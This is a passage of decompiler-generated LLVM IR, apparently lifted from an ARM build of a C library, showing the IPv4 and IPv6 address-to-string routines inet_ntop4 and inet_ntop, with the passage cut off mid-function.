  %v1_10a00 = urem i32 %v2_109f8, 256
  %v2_10a04 = udiv i32 %v1_10a00, 10
  %v3_10a04 = urem i32 %v1_10a00, 10
  store i32 %v2_10a04, i32* %r0.global-to-local, align 4
  %v1_10a08 = or i32 %v3_10a04, 48
  br i1 %v7_109e0, label %dec_label_pc_109f8, label %dec_label_pc_10a20

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109c0
  %v7_10a10 = icmp eq i32 %v1_10a08, 48
  br i1 %v7_10a10, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_109f8
  store i32 %v1_109d8, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_109f8, %bb
  %v1_10a18 = trunc i32 %v1_10a08 to i8
  store i8 %v1_10a18, i8* %v2_109d4, align 1
  %v0_10a4c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a3c

dec_label_pc_10a20:                               ; preds = %dec_label_pc_109c0
  %v2_109ec = add i32 %v1_109d8, %v2_10a70
  %v1_10a34 = trunc i32 %v1_10a08 to i8
  %v3_10a34 = add i32 %v2_109ec, -17
  %v4_10a34 = inttoptr i32 %v3_10a34 to i8*
  store i8 %v1_10a34, i8* %v4_10a34, align 1
  %v0_10a38 = load i32, i32* %r6.global-to-local, align 4
  %v1_10a38 = add i32 %v0_10a38, 1
  store i32 %v1_10a38, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a3c

dec_label_pc_10a3c:                               ; preds = %bb18, %dec_label_pc_10a20
  %v0_10a4c = phi i32 [ %v0_10a4c.pre, %bb18 ], [ %v1_10a38, %dec_label_pc_10a20 ]
  %v0_10a3c = load i32, i32* %sb.global-to-local, align 4
  %v1_10a3c = inttoptr i32 %v0_10a3c to i8*
  %v2_10a3c = load i8, i8* %v1_10a3c, align 1
  %tmp19 = urem i8 %v2_10a3c, 10
  store i32 %v2_10a70, i32* %ip.global-to-local, align 4
  %v1_10a4c = add i32 %v0_10a4c, 1
  store i32 %v1_10a4c, i32* %r0.global-to-local, align 4
  %v1_10a54 = or i8 %tmp19, 48
  %v3_10a58 = add i32 %v2_10a50, %v0_10a4c
  %v4_10a58 = inttoptr i32 %v3_10a58 to i8*
  store i8 %v1_10a54, i8* %v4_10a58, align 1
  %v0_10a5c = load i32, i32* %ip.global-to-local, align 4
  %v1_10a5c = load i32, i32* %r0.global-to-local, align 4
  %v2_10a5c = add i32 %v1_10a5c, %v0_10a5c
  store i32 %v2_10a5c, i32* %r2.global-to-local, align 4
  %v3_10a64 = add i32 %v2_10a5c, -17
  %v4_10a64 = inttoptr i32 %v3_10a64 to i8*
  store i8 46, i8* %v4_10a64, align 1
  %v0_10a68 = load i32, i32* %r0.global-to-local, align 4
  %v1_10a68 = add i32 %v0_10a68, 1
  store i32 %v1_10a68, i32* %r6.global-to-local, align 4
  %v0_10a6c = load i32, i32* %sl.global-to-local, align 4
  %v1_10a6c = add i32 %v0_10a6c, 1
  store i32 %v1_10a6c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %entry, %dec_label_pc_10a3c
  %v0_10a7c = phi i32 [ 0, %entry ], [ %v1_10a68, %dec_label_pc_10a3c ]
  %v1_109c0 = phi i32 [ 0, %entry ], [ %v1_10a6c, %dec_label_pc_10a3c ]
  store i32 %v2_10a70, i32* %ip.global-to-local, align 4
  store i32 %v0_10a7c, i32* %r7.global-to-local, align 4
  %v2_10a80 = add i32 %v0_10a7c, %v2_10a70
  store i32 %v2_10a80, i32* %r5.global-to-local, align 4
  %v7_10a84 = icmp sgt i32 %v1_109c0, 3
  br i1 %v7_10a84, label %dec_label_pc_10a88, label %dec_label_pc_109c0

dec_label_pc_10a88:                               ; preds = %dec_label_pc_10a70
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_10a8c = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_10a8c, i32* %r4.global-to-local, align 4
  %v3_10a90 = add i32 %v2_10a80, -18
  %v4_10a90 = inttoptr i32 %v3_10a90 to i8*
  store i8 0, i8* %v4_10a90, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_10a8c, i32* %r0.global-to-local, align 4
  %v3_10a98 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_10a98, i32* %r0.global-to-local, align 4
  %v2_10a9c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_10a9c, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_10a98, %v2_10a9c
  br i1 %tmp, label %dec_label_pc_10aa8, label %dec_label_pc_10abc

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_10a88
  %v0_10aa8 = call i32 @__GI___errno_location()
  store i32 %v0_10aa8, i32* %r0.global-to-local, align 4
  %v0_10ab0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10ab0, i32* %r2.global-to-local, align 4
  %v2_10ab4 = inttoptr i32 %v0_10aa8 to i32*
  store i32 28, i32* %v2_10ab4, align 4
  %v0_10acc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10acc

dec_label_pc_10abc:                               ; preds = %dec_label_pc_10a88
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_10a8c, i32* @r1, align 4
  %v2_10ac4 = inttoptr i32 %arg2 to i8*
  %v3_10ac4 = call i32 @strcpy(i8* %v2_10ac4, i32 %v2_10a8c)
  store i32 %v3_10ac4, i32* %r0.global-to-local, align 4
  store i32 %v3_10ac4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10acc

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10aa8, %dec_label_pc_10abc
  %v0_10acc = phi i32 [ %v0_10acc.pre, %dec_label_pc_10aa8 ], [ %v3_10ac4, %dec_label_pc_10abc ]
  store i32 %v0_10acc, i32* %r0.global-to-local, align 4
  ret i32 %v0_10acc

; uselistorder directives
  uselistorder i32 %v0_10acc, { 1, 0 }
  uselistorder i32 %v2_10a8c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10a80, { 0, 2, 1 }
  uselistorder i32 %v1_109c0, { 1, 0 }
  uselistorder i32 %v1_10a08, { 1, 0, 2 }
  uselistorder i32 %v2_10a70, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10acc, { 1, 0 }
  uselistorder label %dec_label_pc_10a70, { 1, 0 }
  uselistorder label %dec_label_pc_10a3c, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_10adc = load i32, i32* @r5, align 4
  %v7_10ae8 = icmp eq i32 %arg1, 2
  store i1 %v7_10ae8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_10ae8, label %dec_label_pc_10b0c, label %dec_label_pc_10b00

dec_label_pc_10b00:                               ; preds = %entry
  %v7_10b00 = icmp eq i32 %arg1, 10
  store i1 %v7_10b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b00, label %dec_label_pc_10b20, label %dec_label_pc_10d34

dec_label_pc_10b0c:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_10b18 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_10d2c

dec_label_pc_10b20:                               ; preds = %dec_label_pc_10b00
  %v2_10b20 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10b20, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_10b2c = bitcast i32* %stack_var_-72 to i8*
  %v3_10b2c = call i32 @__GI_memset(i8* %v2_10b2c, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10b50 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10b34

dec_label_pc_10b34:                               ; preds = %dec_label_pc_10b34.dec_label_pc_10b34_crit_edge, %dec_label_pc_10b20
  %v0_10b4c = phi i32 [ %v0_10b34.pre, %dec_label_pc_10b34.dec_label_pc_10b34_crit_edge ], [ 0, %dec_label_pc_10b20 ]
  %v1_10b34 = load i32, i32* @r8, align 4
  %v2_10b34 = add i32 %v1_10b34, %v0_10b4c
  %v3_10b38 = inttoptr i32 %v2_10b34 to i8*
  %v4_10b38 = load i8, i8* %v3_10b38, align 1
  %v6_10b38 = zext i8 %v4_10b38 to i32
  %v1_10b3c = add i32 %v2_10b34, 1
  %v2_10b3c = inttoptr i32 %v1_10b3c to i8*
  %v3_10b3c = load i8, i8* %v2_10b3c, align 1
  %v4_10b3c = zext i8 %v3_10b3c to i32
  %tmp74 = icmp slt i32 %v0_10b4c, 0
  %v4_10b40 = zext i1 %tmp74 to i32
  %v5_10b40 = add i32 %v4_10b40, %v0_10b4c
  %v4_10b44 = mul nuw nsw i32 %v6_10b38, 256
  %v5_10b44 = or i32 %v4_10b3c, %v4_10b44
  store i32 %v5_10b44, i32* %r2.global-to-local, align 4
  %v3_10b48 = sdiv i32 %v5_10b40, 2
  %v1_10b4c = add i32 %v0_10b4c, 2
  store i32 %v1_10b4c, i32* %r0.global-to-local, align 4
  %v4_10b54 = mul i32 %v3_10b48, 4
  %v5_10b54 = add i32 %v4_10b54, %v2_10b50
  %v7_10b58 = icmp eq i32 %v1_10b4c, 15
  store i1 %v7_10b58, i1* %cpsr_z.global-to-local, align 1
  %v2_10b5c = add i32 %v5_10b54, -32
  %v3_10b5c = inttoptr i32 %v2_10b5c to i32*
  store i32 %v5_10b44, i32* %v3_10b5c, align 4
  %v7_10b60 = icmp sgt i32 %v1_10b4c, 15
  br i1 %v7_10b60, label %dec_label_pc_10b64, label %dec_label_pc_10b34.dec_label_pc_10b34_crit_edge

dec_label_pc_10b34.dec_label_pc_10b34_crit_edge:  ; preds = %dec_label_pc_10b34
  %v0_10b34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b34

dec_label_pc_10b64:                               ; preds = %dec_label_pc_10b34
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10b7c

dec_label_pc_10b7c:                               ; preds = %dec_label_pc_10b64, %dec_label_pc_10bc8
  %v0_10bbc = phi i32 [ -1, %dec_label_pc_10b64 ], [ %v0_10bf0, %dec_label_pc_10bc8 ]
  %v0_10bac = phi i32 [ -1, %dec_label_pc_10b64 ], [ %v0_10bdc, %dec_label_pc_10bc8 ]
  %v0_10b90 = phi i32 [ -1, %dec_label_pc_10b64 ], [ %v0_10b907, %dec_label_pc_10bc8 ]
  %v0_10bc8 = phi i32 [ 0, %dec_label_pc_10b64 ], [ %v1_10bc8, %dec_label_pc_10bc8 ]
  %v4_10b80 = mul nuw nsw i32 %v0_10bc8, 4
  %v5_10b80 = add i32 %v4_10b80, %v2_10b50
  %v1_10b84 = add i32 %v5_10b80, -32
  %v2_10b84 = inttoptr i32 %v1_10b84 to i32*
  %v3_10b84 = load i32, i32* %v2_10b84, align 4
  %v2_10b88 = icmp eq i32 %v3_10b84, 0
  %v7_10b90 = icmp eq i32 %v0_10b90, -1
  br i1 %v2_10b88, label %dec_label_pc_10b90, label %dec_label_pc_10ba4

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b7c
  br i1 %v7_10b90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10b90
  store i32 %v0_10bc8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10bc8

.thread:                                          ; preds = %dec_label_pc_10b90
  %v1_10b9c.pre = load i32, i32* @r4, align 4
  %v2_10b9c = add i32 %v1_10b9c.pre, 1
  store i32 %v2_10b9c, i32* @r4, align 4
  br label %dec_label_pc_10bc8

dec_label_pc_10ba4:                               ; preds = %dec_label_pc_10b7c
  br i1 %v7_10b90, label %dec_label_pc_10bc8, label %dec_label_pc_10bac

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10ba4
  %v7_10bac = icmp eq i32 %v0_10bac, -1
  %v0_10bc0.pre = load i32, i32* @r4, align 4
  %v1_10bb4 = load i32, i32* @r7, align 4
  %v7_10bb8 = icmp sgt i32 %v0_10bc0.pre, %v1_10bb4
  %or.cond = or i1 %v7_10bac, %v7_10bb8
  br i1 %or.cond, label %dec_label_pc_10bbc, label %dec_label_pc_10bc4

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bac
  store i32 %v0_10bbc, i32* @r6, align 4
  store i32 %v0_10bc0.pre, i32* @r7, align 4
  br label %dec_label_pc_10bc4

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10bac, %dec_label_pc_10bbc
  %v0_10bac12 = phi i32 [ %v0_10bbc, %dec_label_pc_10bbc ], [ %v0_10bac, %dec_label_pc_10bac ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10bc8

dec_label_pc_10bc8:                               ; preds = %bb, %.thread, %dec_label_pc_10ba4, %dec_label_pc_10bc4
  %v0_10bf0 = phi i32 [ %v0_10bbc, %.thread ], [ %v0_10bc8, %bb ], [ %v0_10bbc, %dec_label_pc_10ba4 ], [ -1, %dec_label_pc_10bc4 ]
  %v0_10b907 = phi i32 [ %v0_10b90, %.thread ], [ %v0_10bc8, %bb ], [ -1, %dec_label_pc_10ba4 ], [ -1, %dec_label_pc_10bc4 ]
  %v0_10bdc = phi i32 [ %v0_10bac, %.thread ], [ %v0_10bac, %bb ], [ %v0_10bac, %dec_label_pc_10ba4 ], [ %v0_10bac12, %dec_label_pc_10bc4 ]
  %v1_10bc8 = add nuw nsw i32 %v0_10bc8, 1
  %v7_10bd0 = icmp slt i32 %v1_10bc8, 8
  br i1 %v7_10bd0, label %dec_label_pc_10b7c, label %dec_label_pc_10bd4

dec_label_pc_10bd4:                               ; preds = %dec_label_pc_10bc8
  %v7_10bd4 = icmp eq i32 %v0_10bf0, -1
  store i1 %v7_10bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bd4, label %dec_label_pc_10bd4.dec_label_pc_10bf4_crit_edge, label %dec_label_pc_10bdc

dec_label_pc_10bd4.dec_label_pc_10bf4_crit_edge:  ; preds = %dec_label_pc_10bd4
  %v1_10c18.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10bf4

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10bd4
  %v7_10bdc = icmp eq i32 %v0_10bdc, -1
  store i1 %v7_10bdc, i1* %cpsr_z.global-to-local, align 1
  %v0_10bec.pre = load i32, i32* @r4, align 4
  br i1 %v7_10bdc, label %dec_label_pc_10bec, label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10bdc
  %v1_10be4 = load i32, i32* @r7, align 4
  %v9_10be4 = icmp eq i32 %v0_10bec.pre, %v1_10be4
  store i1 %v9_10be4, i1* %cpsr_z.global-to-local, align 1
  %v7_10be8 = icmp sgt i32 %v0_10bec.pre, %v1_10be4
  br i1 %v7_10be8, label %dec_label_pc_10bec, label %dec_label_pc_10bf4

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10bdc, %dec_label_pc_10be4
  store i32 %v0_10bec.pre, i32* @r7, align 4
  store i32 %v0_10bf0, i32* @r6, align 4
  br label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10bd4.dec_label_pc_10bf4_crit_edge, %dec_label_pc_10be4, %dec_label_pc_10bec
  %v1_10c18.pre = phi i32 [ %v1_10be4, %dec_label_pc_10be4 ], [ %v1_10c18.pre.pre, %dec_label_pc_10bd4.dec_label_pc_10bf4_crit_edge ], [ %v0_10bec.pre, %dec_label_pc_10bec ]
  %v0_10bf4 = phi i32 [ %v0_10bdc, %dec_label_pc_10be4 ], [ %v0_10bdc, %dec_label_pc_10bd4.dec_label_pc_10bf4_crit_edge ], [ %v0_10bf0, %dec_label_pc_10bec ]
  %v7_10bf4 = icmp eq i32 %v0_10bf4, -1
  store i1 %v7_10bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bf4, label %dec_label_pc_10bf4._crit_edge, label %dec_label_pc_10bfc

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10bf4
  %v7_10bfc = icmp eq i32 %v1_10c18.pre, 1
  store i1 %v7_10bfc, i1* %cpsr_z.global-to-local, align 1
  %v7_10c00 = icmp slt i32 %v1_10c18.pre, 2
  br i1 %v7_10c00, label %bb54, label %dec_label_pc_10bf4._crit_edge

bb54:                                             ; preds = %dec_label_pc_10bfc
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10bf4._crit_edge

dec_label_pc_10bf4._crit_edge:                    ; preds = %dec_label_pc_10bf4, %dec_label_pc_10bfc, %bb54
  %v0_10c18 = phi i32 [ %v0_10bf4, %dec_label_pc_10bfc ], [ -1, %bb54 ], [ %v0_10bf4, %dec_label_pc_10bf4 ]
  %v2_10c08 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_10c08, i32* @r4, align 4
  %v0_10c0c = load i32, i32* @r5, align 4
  %v2_10c0c = add i32 %v0_10c0c, -37304
  store i32 %v2_10c0c, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_10c18 = add i32 %v0_10c18, %v1_10c18.pre
  store i32 %v2_10c18, i32* @sl, align 4
  %v9_10c78 = icmp eq i32 %tmp, 65535
  %v7_10c2068 = icmp eq i32 %v0_10c18, -1
  store i1 %v7_10c2068, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c20

dec_label_pc_10c20:                               ; preds = %dec_label_pc_10bf4._crit_edge, %dec_label_pc_10cd0
  %v7_10c2072 = phi i1 [ %v7_10c2068, %dec_label_pc_10bf4._crit_edge ], [ %v7_10c20, %dec_label_pc_10cd0 ]
  %v0_10c4c71 = phi i32 [ 0, %dec_label_pc_10bf4._crit_edge ], [ %v1_10cd0, %dec_label_pc_10cd0 ]
  %v1_10c3870 = phi i32 [ %v0_10c18, %dec_label_pc_10bf4._crit_edge ], [ %v0_10c20.pre, %dec_label_pc_10cd0 ]
  %v2_10c5069 = phi i32 [ %v2_10c08, %dec_label_pc_10bf4._crit_edge ], [ %v3_10c3c29, %dec_label_pc_10cd0 ]
  br i1 %v7_10c2072, label %dec_label_pc_10c44, label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10c20
  %v9_10c28 = icmp eq i32 %v0_10c4c71, %v1_10c3870
  store i1 %v9_10c28, i1* %cpsr_z.global-to-local, align 1
  %v5_10c2c = icmp slt i32 %v0_10c4c71, %v1_10c3870
  br i1 %v5_10c2c, label %dec_label_pc_10c44, label %dec_label_pc_10c30

dec_label_pc_10c30:                               ; preds = %dec_label_pc_10c28
  %v1_10c30 = load i32, i32* @sl, align 4
  %v9_10c30 = icmp eq i32 %v0_10c4c71, %v1_10c30
  store i1 %v9_10c30, i1* %cpsr_z.global-to-local, align 1
  %v6_10c34 = icmp slt i32 %v0_10c4c71, %v1_10c30
  br i1 %v6_10c34, label %dec_label_pc_10c38, label %dec_label_pc_10c44

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c30
  store i1 %v9_10c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10c28, label %bb56, label %dec_label_pc_10cd0

bb56:                                             ; preds = %dec_label_pc_10c38
  %v1_10c3c = load i32, i32* @sb, align 4
  %v2_10c3c = trunc i32 %v1_10c3c to i8
  %v4_10c3c = inttoptr i32 %v2_10c5069 to i8*
  store i8 %v2_10c3c, i8* %v4_10c3c, align 1
  %v5_10c3c = load i32, i32* @r4, align 4
  %v6_10c3c = add i32 %v5_10c3c, 1
  store i32 %v6_10c3c, i32* @r4, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c30, %dec_label_pc_10c28, %dec_label_pc_10c20
  %v2_10c44 = icmp eq i32 %v0_10c4c71, 0
  store i1 %v2_10c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c44, label %dec_label_pc_10cb4, label %dec_label_pc_10c4c

dec_label_pc_10c4c:                               ; preds = %dec_label_pc_10c44
  %v7_10c4c = icmp eq i32 %v0_10c4c71, 6
  store i1 %v7_10c4c, i1* %cpsr_z.global-to-local, align 1
  %v0_10c50 = load i32, i32* @sb, align 4
  %v1_10c50 = trunc i32 %v0_10c50 to i8
  %v3_10c50 = inttoptr i32 %v2_10c5069 to i8*
  store i8 %v1_10c50, i8* %v3_10c50, align 1
  %v4_10c50 = load i32, i32* @r4, align 4
  %v5_10c50 = add i32 %v4_10c50, 1
  store i32 %v5_10c50, i32* @r4, align 4
  %v0_10c54 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10c54, label %dec_label_pc_10c58, label %dec_label_pc_10cb4

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c4c
  %v0_10c58 = load i32, i32* @r6, align 4
  %v2_10c58 = icmp eq i32 %v0_10c58, 0
  store i1 %v2_10c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c58, label %dec_label_pc_10c60, label %dec_label_pc_10cb4

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c58
  %v0_10c60 = load i32, i32* @r7, align 4
  %v7_10c60 = icmp eq i32 %v0_10c60, 6
  store i1 %v7_10c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c60, label %dec_label_pc_10c80, label %dec_label_pc_10c68

dec_label_pc_10c68:                               ; preds = %dec_label_pc_10c60
  %v7_10c68 = icmp eq i32 %v0_10c60, 5
  store i1 %v7_10c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c68, label %dec_label_pc_10c70, label %dec_label_pc_10cb4

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c68
  store i1 %v9_10c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10c78, label %dec_label_pc_10c80, label %dec_label_pc_10cb4

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c70, %dec_label_pc_10c60
  %v2_10c84 = sub i32 %v2_10b50, %v5_10c50
  %v1_10c88 = add i32 %v2_10c84, -32
  store i32 %v1_10c88, i32* %r2.global-to-local, align 4
  %v0_10c8c = load i32, i32* @r8, align 4
  %v1_10c8c = add i32 %v0_10c8c, 12
  store i32 %v1_10c8c, i32* %r0.global-to-local, align 4
  %v3_10c94 = call i32 @inet_ntop4(i32 %v1_10c8c, i32 %v5_10c50, i32 %v1_10c88)
  store i32 %v3_10c94, i32* %r0.global-to-local, align 4
  %v2_10c98 = icmp eq i32 %v3_10c94, 0
  store i1 %v2_10c98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c98, label %bb57, label %dec_label_pc_10ca4

bb57:                                             ; preds = %dec_label_pc_10c80
  %v1_10c9c = load i32, i32* @r6, align 4
  store i32 %v1_10c9c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10d44

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c80
  %v0_10ca4 = load i32, i32* @r4, align 4
  %v1_10ca4 = inttoptr i32 %v0_10ca4 to i8*
  store i32 %v0_10ca4, i32* %r0.global-to-local, align 4
  %v3_10ca8 = call i32 @strlen(i8* %v1_10ca4)
  store i32 %v3_10ca8, i32* %r0.global-to-local, align 4
  %v0_10cac = load i32, i32* @r4, align 4
  %v2_10cac = add i32 %v0_10cac, %v3_10ca8
  store i32 %v2_10cac, i32* @r4, align 4
  %v0_10ce4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10ce4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10c70, %dec_label_pc_10c68, %dec_label_pc_10c58, %dec_label_pc_10c4c, %dec_label_pc_10c44
  %v0_10cbc = phi i32 [ %v5_10c50, %dec_label_pc_10c70 ], [ %v5_10c50, %dec_label_pc_10c68 ], [ %v5_10c50, %dec_label_pc_10c58 ], [ %v5_10c50, %dec_label_pc_10c4c ], [ %v2_10c5069, %dec_label_pc_10c44 ]
  store i32 %v2_10b50, i32* @lr, align 4
  %v1_10cb8 = load i32, i32* @r5, align 4
  %v4_10cb8 = mul i32 %v1_10cb8, 4
  %v5_10cb8 = add i32 %v4_10cb8, %v2_10b50
  store i32 %v0_10cbc, i32* @r0, align 4
  %v1_10cc0 = add i32 %v5_10cb8, -32
  %v2_10cc0 = inttoptr i32 %v1_10cc0 to i32*
  %v3_10cc0 = load i32, i32* %v2_10cc0, align 4
  store i32 %v3_10cc0, i32* %r2.global-to-local, align 4
  %v0_10cc4 = load i32, i32* @fp, align 4
  %v4_10cc8 = call i32 @sprintf(i32 %v0_10cbc, i32 %v0_10cc4, i32 %v3_10cc0, i32 %v5_10cb8)
  store i32 %v4_10cc8, i32* %r0.global-to-local, align 4
  %v0_10ccc = load i32, i32* @r4, align 4
  %v2_10ccc = add i32 %v0_10ccc, %v4_10cc8
  store i32 %v2_10ccc, i32* @r4, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10cd0:                               ; preds = %bb56, %dec_label_pc_10c38, %dec_label_pc_10cb4
  %v3_10c3c29 = phi i32 [ %v6_10c3c, %bb56 ], [ %v2_10c5069, %dec_label_pc_10c38 ], [ %v2_10ccc, %dec_label_pc_10cb4 ]
  %v0_10cd0 = load i32, i32* @r5, align 4
  %v1_10cd0 = add i32 %v0_10cd0, 1
  store i32 %v1_10cd0, i32* @r5, align 4
  %v0_10c20.pre = load i32, i32* @r6, align 4
  %v7_10cd8 = icmp slt i32 %v1_10cd0, 8
  %v7_10c20 = icmp eq i32 %v0_10c20.pre, -1
  store i1 %v7_10c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10cd8, label %dec_label_pc_10c20, label %dec_label_pc_10cdc

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10cd0
  br i1 %v7_10c20, label %.thread2, label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cdc, %dec_label_pc_10ca4
  %v3_10cf0 = phi i32 [ %v3_10c3c29, %dec_label_pc_10cdc ], [ %v2_10cac, %dec_label_pc_10ca4 ]
  %v0_10ce4 = phi i32 [ %v0_10c20.pre, %dec_label_pc_10cdc ], [ %v0_10ce4.pre, %dec_label_pc_10ca4 ]
  %v1_10ce4 = load i32, i32* @r7, align 4
  %v2_10ce4 = add i32 %v1_10ce4, %v0_10ce4
  %v7_10ce8 = icmp eq i32 %v2_10ce4, 8
  store i1 %v7_10ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ce8, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_10ce4
  %v4_10cf0 = inttoptr i32 %v3_10cf0 to i8*
  store i8 58, i8* %v4_10cf0, align 1
  %v5_10cf0 = load i32, i32* @r4, align 4
  %v6_10cf0 = add i32 %v5_10cf0, 1
  store i32 %v6_10cf0, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10ce4, %dec_label_pc_10cdc, %bb58
  %v2_10cf8 = phi i32 [ %v3_10cf0, %dec_label_pc_10ce4 ], [ %v3_10c3c29, %dec_label_pc_10cdc ], [ %v6_10cf0, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10cf8 = inttoptr i32 %v2_10cf8 to i8*
  store i8 0, i8* %v3_10cf8, align 1
  %v4_10cf8 = load i32, i32* @r4, align 4
  %v5_10cf8 = add i32 %v4_10cf8, 1
  store i32 %v2_10c08, i32* @r1, align 4
  %v2_10d00 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_10d00, i32* %r2.global-to-local, align 4
  %v2_10d04 = sub i32 %v5_10cf8, %v2_10c08
  %v9_10d08 = icmp eq i32 %v2_10d04, %v2_10d00
  store i1 %v9_10d08, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_10d04, %v2_10d00
  br i1 %tmp75, label %dec_label_pc_10d10, label %dec_label_pc_10d24

dec_label_pc_10d10:                               ; preds = %.thread2
  %v0_10d10 = call i32 @__GI___errno_location()
  store i32 %v0_10d10, i32* %r0.global-to-local, align 4
  %v0_10d18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10d18, i32* %r2.global-to-local, align 4
  %v2_10d1c = inttoptr i32 %v0_10d10 to i32*
  store i32 28, i32* %v2_10d1c, align 4
  %v0_10d44.pre = load i32, i32* %r2.global-to-local, align 4
